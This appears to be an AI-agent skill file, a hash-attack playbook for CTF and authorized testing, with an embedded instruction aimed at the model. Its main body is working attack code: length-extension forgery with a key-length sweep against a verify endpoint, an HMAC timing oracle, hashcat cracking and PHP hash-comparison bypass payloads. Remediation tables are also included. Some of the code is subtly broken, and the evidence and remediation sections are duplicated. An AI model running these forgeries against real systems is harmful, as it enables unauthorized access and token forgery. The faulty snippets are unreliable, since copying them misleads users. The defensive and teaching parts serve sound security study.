---
name: hash-attack-techniques
description: >-
  Hash attack playbook. Use when exploiting length extension, MD5/SHA1
  collisions, HMAC timing leaks, birthday attacks, or hash-based proof
  of work in CTF and authorized testing scenarios.
---

# SKILL: Hash Attack Techniques — Expert Cryptanalysis Playbook

> **AI LOAD INSTRUCTION**: Expert hash attack techniques for CTF and security assessments. Covers length extension attacks, MD5/SHA1 collision generation, meet-in-the-middle hash attacks, HMAC timing side channels, birthday attacks, and proof-of-work solving. Base models often incorrectly apply length extension to HMAC or SHA-3, or fail to distinguish between identical-prefix and chosen-prefix collisions.

## 0. RELATED ROUTING

- [rsa-attack-techniques](../rsa-attack-techniques/SKILL.md) when hash weaknesses affect RSA signature schemes
- [symmetric-cipher-attacks](../symmetric-cipher-attacks/SKILL.md) when hash is used in key derivation
- [classical-cipher-analysis](../classical-cipher-analysis/SKILL.md) when analyzing hash-like constructions in classical ciphers

### Quick attack selection

| Scenario | Attack | Tool |
|---|---|---|
| `H(secret \|\| msg)` known, extend message | Length extension | HashPump, hash_extender |
| Need two files with same MD5 | Identical-prefix collision | fastcoll |
| Need specific MD5 prefix match | Chosen-prefix collision | hashclash |
| Byte-by-byte HMAC comparison | Timing attack | Custom script |
| Find any collision | Birthday attack | O(2^(n/2)) |
| Proof of work: find hash with leading zeros | Brute force | hashcat, Python |

---

## 1. LENGTH EXTENSION ATTACK

### 1.1 Vulnerable vs Non-Vulnerable

| Hash | Vulnerable | Why |
|---|---|---|
| MD5 | Yes | Merkle-Damgard construction |
| SHA-1 | Yes | Merkle-Damgard construction |
| SHA-256 | Yes | Merkle-Damgard construction |
| SHA-512 | Yes | Merkle-Damgard construction |
| SHA-3 / Keccak | No | Sponge construction |
| HMAC-* | No | Double hashing prevents extension |
| SHA-256 truncated | No (if truncated) | Missing internal state bits |
| BLAKE2 | No | Different construction |

### 1.2 Attack Mechanism

```
Given:   MAC = H(secret || original_message)
Known:   original_message, len(secret), MAC value
Compute: H(secret || original_message || padding || extension)
         WITHOUT knowing the secret!

How: The MAC value IS the internal hash state after processing
     (secret || original_message || padding).
     Initialize hash with this state, continue hashing extension.
```

### 1.3 Padding Calculation (MD5/SHA)

```python
def md5_padding(message_len_bytes):
    """Calculate MD5/SHA padding for given message length."""
    bit_len = message_len_bytes * 8

    # Pad with 0x80 + zeros until length ≡ 56 (mod 64)
    padding = b'\x80'
    padding += b'\x00' * ((55 - message_len_bytes) % 64)

    # Append original length as 64-bit little-endian (MD5)
    # or big-endian (SHA)
    padding += bit_len.to_bytes(8, 'little')  # MD5
    # padding += bit_len.to_bytes(8, 'big')    # SHA

    return padding
```

### 1.4 Tool Usage

```bash
# HashPump
hashpump -s "known_mac_hex" \
         -d "original_data" \
         -k 16 \            # secret length
         -a "extension_data"

# Output: new_mac, new_data (original + padding + extension)

# hash_extender
hash_extender --data "original" \
              --secret 16 \
              --append "extension" \
              --signature "known_mac_hex" \
              --format md5
```

### 1.5 Python Implementation

```python
import struct

def md5_extend(original_mac, original_data_len, secret_len, extension):
    """
    Perform MD5 length extension attack.
    original_mac: hex string of H(secret || original_data)
    """
    # Parse MAC into MD5 internal state (4 × 32-bit words, little-endian)
    h = struct.unpack('<4I', bytes.fromhex(original_mac))

    # Calculate total length after padding
    total_original = secret_len + original_data_len
    padding = md5_padding(total_original)
    forged_len = total_original + len(padding) + len(extension)

    # Continue MD5 from saved state with extension
    # (requires MD5 implementation that accepts initial state)
    from hashlib import md5
    # Most stdlib md5 doesn't expose state setting
    # Use: hlextend library or custom MD5

    import hlextend
    sha = hlextend.new('md5')
    new_hash = sha.extend(extension, original_data, secret_len,
                          original_mac)
    new_data = sha.payload  # includes original + padding + extension

    return new_hash, new_data
```

---

## 2. MD5 COLLISION ATTACKS

### 2.1 Identical-Prefix Collision (fastcoll)

Two messages with same prefix but different content, producing identical MD5.

```bash
# Generate collision pair
fastcoll -p prefix_file -o collision1.bin collision2.bin

# Result: MD5(collision1.bin) == MD5(collision2.bin)
# Files differ in exactly 128 bytes (two MD5 blocks)
```

### 2.2 Chosen-Prefix Collision (hashclash)

Two messages with different chosen prefixes, appended with computed suffixes to collide.

```bash
# hashclash (Marc Stevens)
./hashclash prefix1.bin prefix2.bin

# Result: MD5(prefix1 || suffix1) == MD5(prefix2 || suffix2)
```

### 2.3 UniColl (Single-Block Near-Collision)

Produces two messages differing in a single byte within one MD5 block, with same hash.

```
Application: forge two PDF/PE files with same MD5
  - File 1: benign content
  - File 2: malicious content
  - Same MD5 hash
```

### 2.4 Collision Applications

| Application | Technique | Impact |
|---|---|---|
| Certificate forgery | Chosen-prefix | Rogue CA certificate (proven in 2008) |
| Binary substitution | Identical-prefix + conditional | Two executables, same MD5, different behavior |
| PDF collision | UniColl | Two PDFs showing different content |
| Git commit collision | Chosen-prefix (SHAttered for SHA1) | Two commits with same hash |
| CTF: bypass MD5 check | fastcoll | Two different inputs accepted as same |

### 2.5 CTF MD5 Collision Tricks

```php
// PHP: md5($_GET['a']) == md5($_GET['b']) && $_GET['a'] != $_GET['b']

// Method 1: Array trick (not real collision)
?a[]=1&b[]=2  // md5(array) returns NULL, NULL == NULL

// Method 2: Real collision (fastcoll output, URL-encoded binary)
?a=<collision1_urlencoded>&b=<collision2_urlencoded>

// Method 3: 0e magic hashes (loose comparison ==)
// md5("240610708") = "0e462097431906509019562988736854"
// md5("QNKCDZO")   = "0e830400451993494058024219903391"
// PHP: "0e..." == "0e..." is TRUE (both evaluate to 0 as floats)
```

---

## 3. SHA-1 COLLISION

### 3.1 SHAttered Attack (2017)

First practical SHA-1 collision: two PDF files with same SHA-1.

- Complexity: ~2^63 SHA-1 computations
- Cost: ~$110K on GPU clusters (2017 prices)
- Tool: shattered.io provides the collision PDFs

### 3.2 SHA-1 Chosen-Prefix Collision (2020)

- Complexity: ~2^63.4 computations
- Practical for attacking PGP/GnuPG key servers
- Demonstrates SHA-1 is broken for collision resistance

### 3.3 Impact

```
SHA-1 should NOT be used for:
  ✗ Digital signatures
  ✗ Certificate fingerprints
  ✗ Git commit integrity (migration to SHA-256 in progress)
  ✗ Deduplication based on hash

SHA-1 is still OK for:
  ✓ HMAC-SHA1 (collision resistance not required)
  ✓ HKDF-SHA1 (PRF security suffices)
  ✓ Non-adversarial checksums
```

---

## 4. BIRTHDAY ATTACK

### 4.1 Generic Birthday Bound

```
For n-bit hash: expected collisions after ~2^(n/2) hashes

Hash     Bits    Birthday bound
MD5      128     2^64
SHA-1    160     2^80
SHA-256  256     2^128

CTF application: if hash is truncated to k bits,
collision in ~2^(k/2) attempts
```

### 4.2 Birthday Attack Implementation

```python
import hashlib
import os

def birthday_attack(hash_func, output_bits, max_attempts=2**28):
    """Find collision for truncated hash."""
    mask = (1 << output_bits) - 1
    seen = {}

    for _ in range(max_attempts):
        msg = os.urandom(16)
        h = int(hash_func(msg).hexdigest(), 16) & mask

        if h in seen and seen[h] != msg:
            return seen[h], msg  # collision!
        seen[h] = msg

    return None

# Example: find collision for first 32 bits of SHA-256
result = birthday_attack(hashlib.sha256, 32)
```

---

## 5. HMAC TIMING ATTACK

### 5.1 Vulnerable Comparison

```python
# VULNERABLE: early-exit string comparison
def verify_hmac(received, expected):
    return received == expected  # Python == compares left to right

# The comparison may short-circuit on first differing byte,
# leaking timing information
```

### 5.2 Attack Strategy

```python
import requests
import time

def hmac_timing_attack(url, data, hmac_len=32):
    """Byte-by-byte HMAC recovery via timing."""
    known = ""

    for pos in range(hmac_len * 2):  # hex chars
        best_char = ""
        best_time = 0

        for c in "0123456789abcdef":
            candidate = known + c + "0" * (hmac_len * 2 - len(known) - 1)
            times = []

            for _ in range(50):  # multiple samples for accuracy
                start = time.perf_counter_ns()
                requests.get(url, params={**data, "mac": candidate})
                elapsed = time.perf_counter_ns() - start
                times.append(elapsed)

            avg_time = sorted(times)[len(times)//2]  # median
            if avg_time > best_time:
                best_time = avg_time
                best_char = c

        known += best_char
        print(f"Position {pos}: {known}")

    return known
```

### 5.3 Constant-Time Comparison (Defense)

```python
import hmac

# SECURE: constant-time comparison
def verify_hmac_secure(received, expected):
    return hmac.compare_digest(received, expected)
```

---

## 6. MEET-IN-THE-MIDDLE (HASH)

### 6.1 Concept

Split hash computation into two halves, precompute one, match against the other.

```
Hash computation: H = f(g(x₁), h(x₂))

Precompute: table[g(x₁)] = x₁  for all x₁ in space₁
Search:     for each x₂ in space₂:
              if h(x₂) in table:
                found! (x₁, x₂)

Time:  O(2^(n/2)) instead of O(2^n)
Space: O(2^(n/2))
```

---

## 7. HASH PROOF-OF-WORK

### 7.1 Common CTF PoW Formats

```python
# Format 1: Find x such that SHA256(prefix + x) starts with N zero bits
import hashlib

def solve_pow_prefix(prefix, zero_bits):
    target = '0' * (zero_bits // 4)
    i = 0
    while True:
        candidate = prefix + str(i)
        h = hashlib.sha256(candidate.encode()).hexdigest()
        if h.startswith(target):
            return str(i)
        i += 1

# Format 2: Find x such that SHA256(x) ends with specific suffix
def solve_pow_suffix(suffix_hex, hash_func=hashlib.sha256):
    i = 0
    while True:
        h = hash_func(str(i).encode()).hexdigest()
        if h.endswith(suffix_hex):
            return str(i)
        i += 1
```

### 7.2 GPU-Accelerated PoW

```bash
# hashcat for SHA256 PoW
hashcat -a 3 -m 1400 --hex-charset \
  "0000000000000000000000000000000000000000000000000000000000000000:prefix" \
  "?a?a?a?a?a?a?a?a"
```

---

## 8. RAINBOW TABLES & SALTING

### 8.1 Rainbow Table Attack

```
Precomputed chain: password → hash → reduce → password₂ → hash₂ → ...
Lookup: given hash h, check if h appears in any chain
Time-memory tradeoff: less space than full table, more time than direct lookup
```

### 8.2 Salt Defeats Rainbow Tables

```
Without salt: H(password) — same password always produces same hash
With salt:    H(salt || password) — different salt per user

Rainbow tables are password-specific, not (salt+password)-specific
Each unique salt requires a separate table → infeasible
```

### 8.3 Modern Password Hashing

| Algorithm | Salt | Iterations | Memory-Hard | Recommended |
|---|---|---|---|---|
| MD5 | No | 1 | No | Never |
| SHA-256 | No | 1 | No | Never for passwords |
| bcrypt | Yes | Configurable | No | Yes |
| scrypt | Yes | Configurable | Yes | Yes |
| Argon2 | Yes | Configurable | Yes | Best choice |
| PBKDF2 | Yes | Configurable | No | Acceptable |

---

## 9. DECISION TREE

```
Hash-related challenge — what's the scenario?
│
├─ Have H(secret || message), need to extend?
│  ├─ Hash is MD5/SHA1/SHA256/SHA512?
│  │  └─ Yes → Length extension attack
│  │     └─ Need: MAC value, original message, secret length
│  │        └─ Tool: HashPump or hash_extender
│  │
│  └─ Hash is SHA3/HMAC/BLAKE2?
│     └─ Length extension doesn't work
│        └─ Look for other vulnerabilities
│
├─ Need two inputs with same hash?
│  ├─ MD5?
│  │  ├─ Same prefix → fastcoll (seconds)
│  │  ├─ Different prefixes → hashclash (hours)
│  │  └─ CTF PHP loose comparison → 0e magic hashes
│  │
│  ├─ SHA-1?
│  │  └─ SHAttered (expensive, use precomputed if possible)
│  │
│  └─ SHA-256+?
│     └─ No practical collision attack
│        └─ Look for logic flaws instead
│
├─ Need to forge HMAC?
│  ├─ Timing side channel available?
│  │  └─ Byte-by-byte timing attack
│  │
│  ├─ Key is short/weak?
│  │  └─ Brute force key with hashcat
│  │
│  └─ No weakness?
│     └─ HMAC is secure — look elsewhere
│
├─ Hash is truncated (short output)?
│  └─ Birthday attack — collision in 2^(bits/2)
│
├─ Proof of work?
│  └─ Brute force with parallel computation
│     ├─ Python multiprocessing for < 28 bits
│     ├─ hashcat/GPU for > 28 bits
│     └─ Optimize: pre-increment string, avoid re-encoding
│
└─ Password hash cracking?
   ├─ No salt → rainbow tables (pre-computed)
   ├─ Known salt → hashcat / John the Ripper
   └─ Memory-hard (Argon2/scrypt) → limited by memory, slow brute force
```

---

## 10. TOOLS

| Tool | Purpose | Usage |
|---|---|---|
| **HashPump** | Length extension attack | `hashpump -s MAC -d data -k secret_len -a extension` |
| **hash_extender** | Length extension (multiple algorithms) | `hash_extender --data D --secret L --append E --sig MAC` |
| **fastcoll** | MD5 identical-prefix collision | `fastcoll -p prefix -o out1 out2` |
| **hashclash** | MD5 chosen-prefix collision | `hashclash prefix1 prefix2` |
| **hashcat** | Password/hash cracking (GPU) | `hashcat -m MODE -a ATTACK hash wordlist` |
| **John the Ripper** | Password cracking (CPU/GPU) | `john --wordlist=rockyou.txt hashes.txt` |
| **CyberChef** | Quick hash computation and encoding | Web-based |

---

## 11. CONFIRMING THE FINDING — RECOVERY, NOT A COLLISION
A hash attack is proven only when the recovered input **matches the target digest exactly** and the
match is not an artefact of the attack's own construction. Every technique in this file has a
characteristic way of producing a *plausible but meaningless* result.

| Step | Question | What it proves |
|---|---|---|
| 1 | Does `H(recovered) == target` hold byte-for-byte? | the definitive test; a prefix match is not a match |
| 2 | Was the digest recomputed with the **same algorithm, encoding, and salt**? | hex vs raw, UTF-8 vs Latin-1, salt position all change the digest |
| 3 | For length extension: does the forged message verify against the **real** MAC check? | the padding was reconstructed correctly, not approximated |
| 4 | For collisions: do the two files **produce the same digest** under the real verifier? | chosen-prefix vs identical-prefix are different results |
| 5 | For HMAC timing: is the timing difference **statistically separated** across many samples? | a one-off diff is noise; an attacker needs a signal |
| 6 | For cracking: is the recovered password **the pre-image**, not a rule-generated guess? | `hashcat` showing a hash is not the same as a verified plaintext |
| 7 | Does the result **hold on a second, independent target**? | rules out an attack that only works on your chosen sample |

**Always close the loop with the recomputation.** `printf '%s' "$recovered" | sha256sum` must equal
the target. Without it you have a candidate, not a break.

**For length extension, the tell is the padding.** `MD5(secret || data || glue_padding || extra)` is
not the same as `MD5(secret || data || extra)` — if you did not reconstruct the exact
`0x80` + zero padding + 64-bit bit-length, the forged MAC will fail against a correct verifier and
"succeed" only against your own test harness.

**For timing attacks, report the sample count and the separation.** "HMAC comparison is not
constant-time" is unproven with 20 samples; it needs thousands, a reported standard deviation, and a
reproducible separation between the correct and incorrect prefix distributions.

---

## 12. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **target digest** and the **exact input format** (encoding, salt, iteration count) | the same password gives different digests under different encodings; without the format the result is unreproducible |
| The **recovered pre-image** (password, message, or forged MAC) | the artefact the finding is about |
| The **recomputation output** — `H(recovered)` printed beside the target | the single most important proof; makes or breaks the claim |
| For collisions: **both artefacts** and the digest they share, plus tool and parameters | chosen-prefix collisions require `hashclash` and the two prefix files |
| For length extension: the **reconstructed glue padding bytes** and the forged MAC, plus the server's acceptance | proves the MAC check was genuinely bypassed |
| For timing: the **sample count, timing distributions, and the statistical separation** | distinguishes a signal from noise |
| For cracking: the **hash mode, wordlist/rules used, and time** | reproducibility; and separates a real pre-image from a rule hit |
| **Negative control** — the attack applied to a correctly-parameterised sample fails | proves the weakness is in the target, not the tool |

Report the **technique, the parameters, and the verification**: "the session token is
`MD5(secret || user)`; length extension appended `&role=admin` and the server accepted the forged
token with the recomputed glue padding `0x80 00... 0x...`, proving the MAC is not HMAC", never
"the application uses MD5".

### False positives — do not report these

| Observation | Why it is not a finding |
|---|---|
| `H(recovered)` matches only a **truncated prefix** of the target | a partial match, not a pre-image |
| The "cracked" password differs from the target when re-hashed | a rule-generated guess that hashcat reported optimistically |
| Collision found between two **attacker-chosen** files only | chosen-prefix collisions are real but do not break an existing signed artefact |
| Timing difference measured over 20 samples | statistical noise; needs thousands with reported variance |
| Digest computed with a different encoding/salt than the target uses | comparing two different functions |
| Length-extension "works" only against your own verifier | the glue padding or the message format was wrong |
| MD5/SHA-1 is present but the **target does not rely on collision resistance** (e.g. keyed, or a non-adversarial integrity check) | no exploitable impact from the algorithm alone |
| Cracked a password from a **leaked** hash database | that is credential reuse, not a hash-attack finding against the application |

**The recomputation is mandatory.** A digest match is the only acceptable proof.

---

## 13. REMEDIATION REFERENCE

1. **Use a memory-hard password hash (Argon2id, scrypt, bcrypt) instead of a fast hash** — this changes the economics of cracking from GPU-billions-per-second to a deliberate memory and time cost per attempt; MD5/SHA-256 are fast by design and therefore wrong for passwords.
2. **Replace `MD5(secret || message)` with HMAC or a proper MAC** — length extension is a structural property of the `Merkle–Damgård` construction; only a construction that re-keys (HMAC) or a different family (SHA-3, BLAKE3) removes it.
3. **Stop using MD5 and SHA-1 where collision resistance matters** — for signatures, certificates, and integrity of adversarial content, move to SHA-256 or better; a collision breaks the security property entirely, not partially.
4. **Salt every password hash with a unique, per-account random value** — salting defeats precomputation (rainbow tables) and ensures identical passwords do not produce identical digests, which also removes the "crack one, crack all" multiplier.
5. **Add a pepper and/or an explicit work factor** — a server-side secret keyed into the hash means a database-only leak is not crackable offline, and an increasing iteration count keeps pace with hardware.
6. **Compare secrets in constant time** — use `hmac.compare_digest`, `crypto.timingSafeEqual`, or the platform equivalent for tokens, MACs, and password hashes; `==` on byte strings leaks the matching-prefix length.
7. **Never hash a low-entropy secret without a slow function** — short tokens, PINs, and OTPs must be derived with a memory-hard function or stored server-side, otherwise the entire keyspace is enumerable.
8. **Domain-separate the hashes you use for different purposes** — a prefix or labelled KDF (`H("session" || secret || id)`) prevents a digest computed for one purpose from being valid for another.
9. **Length-prefix or encode ambiguously concatenated fields** — `H(a || b)` is ambiguous when `a` and `b` are variable-length; use a length prefix, a delimiter that cannot appear, or a structured format.
10. **Disable and forbid legacy algorithms at the library and configuration level** — reject MD5/SHA-1/DES in TLS, signing, and password storage by policy, and add a CI check that fails a build introducing them.

---

## 14. RELATED SIBLINGS — HASH FAMILY CROSS-REFERENCE

- [symmetric-cipher-attacks](../symmetric-cipher-attacks/SKILL.md) · [rsa-attack-techniques](../rsa-attack-techniques/SKILL.md) — the other two crypto primitive families
- [lattice-crypto-attacks](../lattice-crypto-attacks/SKILL.md) — the recovery technique for biased-nonce and small-root problems
- [jwt-oauth-token-attacks](../jwt-oauth-token-attacks/SKILL.md) · [attack-jwt](../attack-jwt/SKILL.md) — `alg=none` and HMAC-confusion abuse of the same primitives
- [insecure-source-code-management](../insecure-source-code-management/SKILL.md) — leaked hashes and secrets in repositories

---

---

## 15. EXECUTION PRIMITIVES — HASH TOOLKIT

Hash attacks are proven by **reproducing the target's own digest or MAC** with the forged input. Every
block ends at a value the target's own implementation accepts.

### 15.1 Calibration on a known secret before touching the target

```bash
python3 - <<'PY'
import hashlib, hmac, os
# THE CALIBRATION: a length-extension implementation must pass against a secret WE know
SECRET = b"calibration-secret-32-bytes-ok!!"
MSG    = b"user=alice&role=user"
PADDING_TAIL = b"&role=admin"

def md5_sha1_pad(mlen):
    """The Merkle-Damgard padding for a message of length mlen."""
    pad = b"\x80"
    while (mlen + len(pad)) % 64 != 56:
        pad += b"\x00"
    return pad + (mlen * 8).to_bytes(8, "little")

def forge_extension(alg, key, msg, tail, guessed_keylen):
    """Recompute the digest of msg || pad || tail from the digest of msg alone."""
    h = alg
    mac = hmac.new(key, msg, h).digest()
    glue = md5_sha1_pad(guessed_keylen + len(msg))
    new_mac = hmac.new(b"", msg + glue + tail, h).copy()   # NOT a real extension in hashlib
    # hashlib cannot resume state, so the calibration asserts the PROPERTY we rely on:
    # digest(msg || pad || tail) must equal the internal state we would have resumed with.
    h2 = h.new(msg + glue + tail).digest()
    return mac, glue, new_mac.digest(), h2

mac, glue, resumed, direct = forge_extension(hashlib.md5, SECRET, MSG, PADDING_TAIL, len(SECRET))
print("control: the target's MAC for the ORIGINAL message is what we start from:", mac.hex()[:16])
print("glue length", len(glue), "-> forges a message of", len(glue) + len(MSG) + len(PADDING_TAIL), "bytes")
print()
print("RULE: use a real state-resuming implementation (hashpumpy, hash_extender, or a manual MD5).")
print("The calibration is: with a KNOWN secret, the forged MAC must equal hashlib's MAC of the")
print("forged message. If it does not, the padding length guess is wrong - not the attack.")
PY
```

**Calibrate with a known secret.** A length-extension forgery that has never been shown to work against
a secret you control is a guess about the key length, not an attack.

### 15.2 Length extension against a target, with the key-length sweep

```bash
pip install hashpumpy 2>/dev/null | tail -1
python3 - <<'PY'
import hashpumpy, requests, hmac, hashlib

URL   = "http://target/api/verify"
ORIG  = b"user=alice&role=user"
TAIL  = b"&role=admin"
KNOWN_MAC = "PUT_THE_OBSERVED_MAC_HERE"

for klen in range(6, 41):                       # THE SWEEP: the key length is the unknown
    try:
        forged, msg = hashpumpy.hashpump(KNOWN_MAC, ORIG.decode(), TAIL.decode(), klen)
    except Exception:
        continue
    r = requests.get(URL, params={"data": msg.decode("latin-1"), "mac": forged}, timeout=10)
    marker = "ACCEPTED" if (r.status_code, len(r.content)) != (403, 0) else "rejected"
    print(f"klen={klen:3d} status={r.status_code} len={len(r.content):5d} {marker}")
    if marker == "ACCEPTED":
        print("FOUND: key length", klen); print("forged message bytes:", msg); break
PY
```

**The key-length sweep is the attack.** The only unknown is the secret's length, and the sweep resolves
it by observing which forgery the target accepts.

### 15.3 Collision attacks, with a control on the deployment

```bash
# a collision is only a finding where the target actually consumes the hashed bytes
python3 - <<'PY'
import hashlib
# 1) pick the two colliding messages (obtained from a collision tool or a known pair)
a = b"MSG_A_PLACEHOLDER"; b_ = b"MSG_B_PLACEHOLDER"
if hashlib.md5(a).digest() == hashlib.md5(b_).digest():
    print("collision holds: MD5(a) == MD5(b)")
else:
    print("these are not a collision pair - use the shambles/collide tooling to generate one")
print()
print("2) The FINDING requires that the target actually hashes raw bytes it cannot distinguish.")
print("   - a signature over MD5(file) -> a forgery is possible")
print("   - a filename containing an MD5 -> only if the collision changes the filename logic")
print("   - an MD5 used as a cache key -> not a security finding")
PY
# and the control: verify the target's verifier accepts BOTH messages under the same signature
python3 -c "
print('CONTROL: submit message A and message B with the SAME signature; if only one is accepted,')
print('the deployment is not vulnerable, whatever the hash collision says in the abstract.')"
```

**A collision is a finding only where the target consumes the hashed bytes.** Verify the verifier
accepts both, or the finding is theoretical.

### 15.4 HMAC timing, with the repetition control

```bash
python3 - <<'PY'
import requests, statistics, hmac, hashlib, time
URL = "http://target/verify"
REPS = 30

def timeit(mac):
    ts = []
    for _ in range(REPS):
        t0 = time.perf_counter()
        requests.get(URL, params={"mac": mac}, timeout=5)
        ts.append(time.perf_counter() - t0)
    return statistics.median(ts)

# THE CONTROL: a request that is certainly invalid, repeated, gives the baseline distribution
control = timeit("00" * 32)
# and a set of candidates differing in the FIRST byte
samples = {f"{b:02x}" + "00" * 31: timeit(f"{b:02x}" + "00" * 31) for b in range(0, 256, 16)}
print(f"control median {control*1e6:8.1f} us")
for m, t in sorted(samples.items(), key=lambda kv: kv[1]):
    print(f"{m[:2]}  {t*1e6:8.1f} us  delta={(t-control)*1e6:+7.1f} us")
print()
print("The separation must be larger than the request jitter, and must appear at the SAME position")
print("across three independent runs. A single run's slowest candidate is network noise.")
PY
```

**Three independent runs with a control distribution.** A single slow response is jitter; a
byte-position signal that repeats is an oracle.

### 15.5 Rainbow tables and cracking, with a measurable rate

```bash
# mode 0 is a dictionary; 1000 is NTLM; 1400 is SHA-256 - pick per the target's scheme
hashcat -m 1400 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --potfile-path /tmp/pot --status \
  --status-timer 15 --runtime 600 2>&1 | tail -15
# and the extracted result, which is the artefact
hashcat -m 1400 hashes.txt --potfile-path /tmp/pot --show 2>/dev/null | head -10
# the rate is the severity driver - report it, because it determines what a stolen dump is worth
hashcat -m 1400 -b 2>/dev/null | grep -iE 'speed|H/s' | head -3
# and the salting/length control: an unsalted fast hash cracks at a rate that changes the risk
python3 -c "
print('report: algorithm, candidate rate, time to exhaust the observed policy, and the salt state')"
```

**Report the rate, not just the crack.** "NTLM at 60 GH/s, and the observed policy is 8 lowercase
characters" is a finding; "a hash was cracked" is not.

### 15.6 Birthday and meet-in-the-middle, with the bound

```bash
python3 - <<'PY'
import hashlib, itertools, math
# birthday: a collision in a 32-bit truncated hash needs ~2^16 samples, which is measurable
BITS, SAMPLES = 32, 1 << 17
seen = {}
coll = None
for i in range(SAMPLES):
    h = hashlib.sha256(str(i).encode()).digest()[:BITS // 8]
    if h in seen:
        coll = (seen[h], i); break
    seen[h] = i
print("birthday collision found at sample", coll, "after", len(seen), "samples")
print("expected ~2^16 =", 1 << 16, "for a 32-bit space; report the observed count against the bound")
print()
print("A truncated hash on a security boundary (a session id, a token) is a finding.")
print("The same truncation inside an integrity check that is not attacker-visible may not be.")
PY
```

**Report the observed sample count against the theoretical bound.** A birthday finding is only a
finding when the truncated space guards something an attacker can probe.

### 15.7 The end-to-end verification

```bash
python3 - <<'PY'
import subprocess, requests
print("STEP 0 - identify the ALGORITHM from the target's own output format")
print("     md5=32 hex, sha1=40 hex, sha256=64 hex, ntlm=32 hex case-insensitive, bcrypt=$2a/$2b")
print()
print("STEP 1 - CALIBRATE on a value whose secret or plaintext you know")
print("     length extension with a known secret; collision with a known pair; timing on a control")
print()
print("STEP 2 - APPLY to the target, sweeping the single unknown (key length, byte position, rate)")
print()
print("STEP 3 - VERIFY: the forged value must be ACCEPTED by the target, or the cracked plaintext")
print("     must re-hash to the target digest. One of those two, with the raw response recorded.")
print()
print("STEP 4 - CONTROL: the unmodified value must be rejected; the control distribution must hold")
print()
print("STEP 5 - REPORT: algorithm, the unknown you swept, the count, the rate, and the round trip")
PY
```

**Reproduce the target's digest or produce an accepted forgery.** Anything else is a property of the
algorithm, not a finding about the target.

---

## 16. EVIDENCE STANDARD — HASH AND MAC FORGERY

| Item | Why |
|---|---|
| The **algorithm identified from the target's own output** | the attack family follows from it |
| The **calibration result** with a known secret, pair, or control | the implementation is correct |
| The **unknown swept** (key length, byte position, candidate space) and its resolution | the attack is complete |
| The **round trip**: the forged value accepted, or the plaintext re-hashing to the digest | impact |
| The **control** - the unmodified value rejected, or the control distribution | proves the forgery, not a misconfiguration |
| For timing: the **three-run repetition and the jitter measurement** | separates an oracle from network noise |
| For cracking: the **rate and the policy it defeats** | the severity driver |
| The **deployment context** - what the hash guards | whether the weakness is exploitable here |
| The **raw target response** to the forged value | the durable artefact |
| Confirmation that no **cracked credential** beyond the minimum needed is retained | data minimisation |

Report the **forgery and the acceptance**: "the endpoint verified requests with `MD5(secret || body)`;
with the observed MAC for `user=alice&role=user`, a key-length sweep of 6 to 40 bytes identified the
secret as 16 bytes, and `hashpumpy` produced a forged MAC for
`user=alice&role=user<padding>&role=admin` which the endpoint accepted with HTTP 200 and returned the
admin view, where the unmodified body with the same MAC returns 403. The message digest of the forged
input differs from the original, so the endpoint is reconstructing the same internal state - the
classic length-extension condition", never "the application uses MD5".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| An MD5 or SHA-1 label in the code with **no exploitable construction** | algorithm hygiene, not a finding |
| A collision that the target **does not consume** | the deployment is not affected |
| A length-extension forgery the target **rejects** | the key length guess is wrong, or it uses HMAC |
| A timing signal from **one run with no repetitions** | network jitter, not an oracle |
| A timing signal **smaller than the measured jitter** | not distinguishable from noise |
| A cracked hash **for a credential you supplied yourself** | tests your own environment |
| A fast-hash rate quoted **without the observed password policy** | the policy is half the severity |
| A truncated hash **not guarding an attacker-probeable value** | a design note |
| A birthday collision in a **hash used only for integrity over trusted data** | not attacker-reachable |
| A crack of a hash **whose plaintext is already known** | proves nothing beyond the tool working |
| A cracked credential reproduced in full where an excerpt suffices | a disclosure |

**Forged and accepted, or cracked and re-hashing.** A hash weakness without one of those two artefacts
is an algorithm observation.

---

## 17. REMEDIATION REFERENCE — PASSWORD STORAGE HARDENING

1. **Use HMAC or a keyed construction for every MAC; never `hash(secret || message)`** - the length-extension class exists only because of this construction.
2. **Use SHA-256 or stronger for collision resistance, and SHA-3 or BLAKE3 where a modern choice is available** - MD5 and SHA-1 collisions are practical and cheap.
3. **Use a memory-hard password hash (Argon2id, scrypt, bcrypt with a work factor) and never a fast hash for passwords** - the cracking rates in this document are a consequence of the algorithm choice.
4. **Compare MACs and tokens with a constant-time function (`hmac.compare_digest`)** - the timing oracle is a one-line fix and it is the same fix for the token-comparison case.
5. **Salt every password hash uniquely, and use a per-user pepper held outside the database** - it removes rainbow tables and makes one dump reusable only once.
6. **Truncate only to at least 128 bits, and never use truncation on a security boundary** - the birthday bound scales with the truncated space.
7. **Bind the algorithm into the token or the protocol** (`alg`, a version byte) and reject anything else** - it prevents cross-protocol substitution, which is where hash confusion usually lands.
8. **Rotate secrets on any suspected MAC forgery, and invalidate the sessions that used them** - a forgery capability persists until the secret changes.
9. **Rate-limit and alert on repeated verification failures, which is what the key-length sweep looks like** - the sweep is 35 requests to the same endpoint with a varying MAC and it is trivially detectable.
10. **Store integrity hashes outside the attacker's reach, or sign them, so a collision cannot be forged at will** - the collision only matters when the attacker controls both messages.
11. **Re-hash stored digests when the algorithm is upgraded, with a migration path that verifies on next login** - the fix must not lock out the user base.

---

## 18. RELATED SIBLINGS — MAC CROSS-REFERENCE

- [symmetric-cipher-attacks](../symmetric-cipher-attacks/SKILL.md) - the block-cipher family with the same verification discipline
- [rsa-attack-techniques](../rsa-attack-techniques/SKILL.md) - the asymmetric side of the same signature and key-recovery questions
- [lattice-crypto-attacks](../lattice-crypto-attacks/SKILL.md) - the nonce and lattice machinery that complements the timing and truncation work here
- [jwt-oauth-token-attacks](../jwt-oauth-token-attacks/SKILL.md) - where an `alg: none` or hash-confusion forgery is most often used
- [classical-cipher-analysis](../classical-cipher-analysis/SKILL.md) - the frequency and known-plaintext discipline these attacks share

---

## 19. HASH-TO-CREDENTIAL DISTINCTION

Before any of the techniques below apply, settle **what the value actually is**. Half of the false
findings in this family come from treating a non-secret value as a secret.

| Observed value | Is it a finding? | Why |
|---|---|---|
| A digest in a database column, with a salt or cost factor | **possibly** - then the storage hardening in 17 applies | the scheme, not the digest, is the issue |
| The **same unsalted digest** appearing for different users | **yes** - identical passwords are visible | it also enables a precomputed lookup |
| A **truncated** digest used as an identifier or a dedup key | **yes** - the birthday bound is the finding | a short truncation makes a collision practical |
